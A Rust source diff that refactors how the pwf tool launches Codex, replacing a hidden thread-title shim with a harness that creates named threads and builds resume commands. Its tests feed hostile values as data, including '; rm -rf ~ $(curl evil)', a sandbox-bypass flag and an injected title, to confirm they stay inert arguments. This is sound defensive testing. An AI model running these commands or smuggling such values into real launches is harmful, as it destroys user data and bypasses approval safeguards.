@@ -1,134 +1,180 @@
-//! Encodes Codex launches through pwf's hidden thread-title shim.
+//! Creates named Codex threads and prepares resume launches.
 
-use std::time::{SystemTime, UNIX_EPOCH};
+use pwf_application::pending_work::session::{self, AgentLaunch, AgentProbe, CodexSessionClient};
 
-use pwf_application::pending_work::session::AgentLaunch;
+use super::{
+    super::codex_app_server::{NamedCodexThread, start_and_name_thread},
+    argv::LaunchArgv,
+    probe,
+};
+use crate::session::CodexThreadPreparationError;
 
-#[doc(hidden)]
-pub const LAUNCH_COMMAND: &str = "__codex-thread-title";
-#[doc(hidden)]
-pub const WORKER_COMMAND: &str = "__codex-thread-title-worker";
-#[doc(hidden)]
-pub const BINARY: &str = "codex";
-#[doc(hidden)]
-pub const TITLE_FLAG: &str = "--title";
-#[doc(hidden)]
-pub const CWD_FLAG: &str = "--cwd";
-#[doc(hidden)]
-pub const SINCE_FLAG: &str = "--since";
-#[doc(hidden)]
-pub const ARG_SEPARATOR: &str = "--";
+const BINARY: &str = "codex";
+const THREAD_ID_PREVIEW: &str = "<thread-id returned by thread/start>";
 
-const PWF_FALLBACK_BINARY: &str = "pwf";
+struct CodexLaunchPlan {
+    title: String,
+    repository: String,
+    model: Option<String>,
+    prompt: String,
+}
 
-// FIXME: this silently ignores almost every parameter! bad abstraction, there must be a
-// 'ClaudeLaunch' struct instead that clearly defines what it uses
-pub(super) fn launch_argv(launch: &AgentLaunch) -> Vec<String> {
-    // TODO: should use the Argv abstraction
-    let mut argv = vec![BINARY.to_string()];
-    if let Some(model) = launch.model.clone() {
-        // TODO: move this to constants owned by a codex struct.
-        argv.push("--model".to_string());
-        argv.push(model.clone());
+impl From<&AgentLaunch> for CodexLaunchPlan {
+    fn from(launch: &AgentLaunch) -> Self {
+        Self {
+            title: launch.title.clone(),
+            repository: launch.repository.clone(),
+            model: launch.model.clone(),
+            prompt: launch.prompt.clone(),
+        }
+    }
+}
+
+/// Probes Codex and prepares named-thread resume launches.
+#[derive(Debug, Clone, Copy, Default)]
+pub struct CodexHarness;
+
+impl CodexHarness {
+    /// Probes the Codex binary.
+    #[must_use]
+    pub fn probe() -> AgentProbe {
+        probe(BINARY)
     }
 
-    argv.push(ARG_SEPARATOR.to_string());
-    argv.push(launch.prompt.clone());
-    argv
+    /// Returns the exact prepared Codex argv for previewing.
+    #[must_use]
+    pub fn preview(launch: &AgentLaunch) -> Vec<String> {
+        let plan = CodexLaunchPlan::from(launch);
+        resume_argv(plan, THREAD_ID_PREVIEW.to_string())
+    }
+
+    /// Creates and names a Codex thread, then prepares its resume argv.
+    ///
+    /// # Errors
+    ///
+    /// Returns an error when app-server startup, initialization, thread creation, naming, cleanup,
+    /// or shutdown fails.
+    pub fn prepare(
+        launch: &AgentLaunch,
+    ) -> Result<PreparedCodexLaunch, CodexThreadPreparationError> {
+        Self::prepare_with_binary(launch, BINARY)
+    }
+
+    fn prepare_with_binary(
+        launch: &AgentLaunch,
+        app_server_binary: &str,
+    ) -> Result<PreparedCodexLaunch, CodexThreadPreparationError> {
+        let plan = CodexLaunchPlan::from(launch);
+        let named_thread = start_and_name_thread(
+            app_server_binary,
+            &plan.title,
+            &plan.repository,
+            plan.model.as_deref(),
+        )?;
+        Ok(PreparedCodexLaunch::from_named_thread(named_thread, plan))
+    }
 }
 
-// FIXME: this does not work at all. the thread title is still not being set. not to mention it
-// couples the exec with the remainder of the argv build. it must be refactored then fixed.
-/// Builds the hidden pwf shim invocation that launches and names one Codex thread.
-#[must_use]
-#[doc(hidden)]
-pub fn thread_title_launch_argv(title: String, cwd: String, prompt: String) -> Vec<String> {
-    let mut argv = vec![
-        current_pwf_exe(),
-        LAUNCH_COMMAND.to_string(),
-        TITLE_FLAG.to_string(),
-        title,
-        CWD_FLAG.to_string(),
-        cwd,
-        SINCE_FLAG.to_string(),
-        now_unix_seconds().to_string(),
-        ARG_SEPARATOR.to_string(),
-        BINARY.to_string(),
-        ARG_SEPARATOR.to_string(),
-    ];
-    argv.push(prompt);
-    argv
+impl CodexSessionClient for CodexHarness {
+    type Error = CodexThreadPreparationError;
+
+    fn probe(&self) -> AgentProbe {
+        Self::probe()
+    }
+
+    fn preview(&self, launch: &AgentLaunch) -> Vec<String> {
+        Self::preview(launch)
+    }
+
+    fn prepare(&self, launch: &AgentLaunch) -> Result<session::PreparedCodexLaunch, Self::Error> {
+        let prepared = Self::prepare(launch)?;
+        Ok(session::PreparedCodexLaunch::new(
+            prepared.thread_id,
+            prepared.argv,
+        ))
+    }
 }
 
-fn current_pwf_exe() -> String {
-    std::env::current_exe().ok().map_or_else(
-        || PWF_FALLBACK_BINARY.to_string(),
-        |path| path.to_string_lossy().into_owned(),
-    )
+/// Contains a named Codex thread's resume argv.
+pub struct PreparedCodexLaunch {
+    thread_id: String,
+    argv: Vec<String>,
 }
 
-fn now_unix_seconds() -> u64 {
-    SystemTime::now()
-        .duration_since(UNIX_EPOCH)
-        .unwrap_or_default()
-        .as_secs()
+impl PreparedCodexLaunch {
+    fn from_named_thread(named_thread: NamedCodexThread, plan: CodexLaunchPlan) -> Self {
+        let thread_id = named_thread.into_id();
+        Self {
+            argv: resume_argv(plan, thread_id.clone()),
+            thread_id,
+        }
+    }
+
+    /// Returns the prepared argv without exposing mutable access.
+    #[must_use]
+    pub fn argv(&self) -> &[String] {
+        &self.argv
+    }
+
+    /// Returns the exact named thread ID without transferring ownership.
+    #[must_use]
+    pub fn thread_id(&self) -> &str {
+        &self.thread_id
+    }
+}
+
+fn resume_argv(plan: CodexLaunchPlan, thread_id: String) -> Vec<String> {
+    let mut argv = LaunchArgv::new(BINARY).positional("resume");
+    if let Some(model) = plan.model {
+        argv = argv.flag("--model", model);
+    }
+    argv.positional(thread_id).into_guarded(plan.prompt)
 }
 
 #[cfg(test)]
 mod tests {
-    use pwf_application::pending_work::session::Agent;
+    use pwf_application::pending_work::session::{Agent, AgentLaunch};
 
-    use super::*;
+    use super::CodexHarness;
+    #[cfg(unix)]
+    use crate::session::codex_app_server::{AppServerFixture, OWNED_THREAD_ID};
 
-    fn launch() -> AgentLaunch {
-        AgentLaunch {
+    #[test]
+    #[cfg(unix)]
+    fn prepares_named_id_model_and_hostile_values_as_separate_arguments() {
+        let fixture = AppServerFixture::successful();
+        let launch = AgentLaunch {
             agent: Agent::Codex,
             task_id: "PWF-0068".to_string(),
-            title: "PWF-0068 - codex dispatch".to_string(),
+            title: "\"; thread/delete everything".to_string(),
             repository: "/repo".to_string(),
-            prompt: "Pending-work ID: PWF-0068\nProject: pwf\n\ndo PWF-0068".to_string(),
-            model: None,
-        }
-    }
+            prompt: "; rm -rf ~ $(curl evil)\n--dangerously-bypass-approvals-and-sandbox"
+                .to_string(),
+            model: Some("gpt-8-billion".to_string()),
+        };
 
-    // TODO: delete or rewrite based after thread_title_launch_argv is refactored
-    // #[test]
-    // fn builds_title_shim_argv_with_guarded_codex_prompt() {
-    //     let prepared = launch();
+        let prepared =
+            CodexHarness::prepare_with_binary(&launch, fixture.binary.to_str().unwrap()).unwrap();
 
-    //     let argv = launch_argv(&prepared);
-
-    //     assert_eq!(argv[1], LAUNCH_COMMAND);
-    //     assert!(argv.contains(&prepared.title));
-    //     assert!(argv.contains(&prepared.repository));
-    //     let codex_position = argv.iter().position(|argument| argument == BINARY).unwrap();
-    //     assert_eq!(argv[codex_position + 1], ARG_SEPARATOR);
-    //     assert_eq!(argv[codex_position + 2], prepared.prompt);
-    //     assert_eq!(argv.last(), Some(&prepared.prompt));
-    // }
-
-    #[test]
-    fn model_is_encoded_for_codex() {
-        let mut prepared = launch();
-        prepared.model = Some("gpt-8-billion".to_string());
-
-        let argv = launch_argv(&prepared);
-
-        assert!(argv.contains(&"--model".to_string()));
-        assert!(argv.contains(&"gpt-8-billion".to_string()));
-    }
-
-    #[test]
-    fn hostile_prompt_stays_one_inert_element() {
-        let mut prepared = launch();
-        prepared.prompt =
-            "; rm -rf ~ $(curl evil)\n--dangerously-bypass-approvals-and-sandbox".to_string();
-
-        let argv = launch_argv(&prepared);
-
-        let codex_position = argv.iter().position(|argument| argument == BINARY).unwrap();
-        assert_eq!(argv[codex_position + 1], ARG_SEPARATOR);
-        assert_eq!(argv[codex_position + 2], prepared.prompt);
-        assert_eq!(argv.last(), Some(&prepared.prompt));
+        assert_eq!(
+            prepared.argv(),
+            [
+                "codex",
+                "resume",
+                "--model",
+                "gpt-8-billion",
+                OWNED_THREAD_ID,
+                "--",
+                "; rm -rf ~ $(curl evil)\n--dangerously-bypass-approvals-and-sandbox",
+            ]
+        );
+        assert_eq!(prepared.thread_id(), OWNED_THREAD_ID);
+        let requests = fixture.requests();
+        assert_eq!(requests[2]["params"]["cwd"], "/repo");
+        assert_eq!(requests[2]["params"]["model"], "gpt-8-billion");
+        assert_eq!(
+            requests[3]["params"]["name"],
+            "\"; thread/delete everything"
+        );
     }
 }
